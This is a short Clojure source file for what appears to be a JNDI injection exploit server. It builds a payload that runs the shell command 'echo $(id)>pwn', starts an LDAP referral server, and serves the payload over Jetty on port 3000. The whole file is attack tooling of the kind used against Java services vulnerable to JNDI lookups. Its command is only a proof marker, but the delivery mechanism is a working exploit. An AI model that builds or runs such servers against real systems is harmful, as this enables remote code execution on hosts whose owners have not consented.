(ns jndi-injector-clj.core
  (:gen-class)
  (:import [org.pwn
            Payload])
  (:require [jndi-injector-clj.ldap :as ldap]
            [ring.adapter.jetty :as jetty]))

(def payload (Payload/build "echo $(id)>pwn") )

(defn handler [request]
  (println "[+] incoming request " (:uri request))
  {:status 200
   :body payload})

(defn -main [] 
  (.start (Thread. (fn [] (ldap/start "http://localhost:3000/" "Pwned"))))
  (jetty/run-jetty handler {:port 3000}))
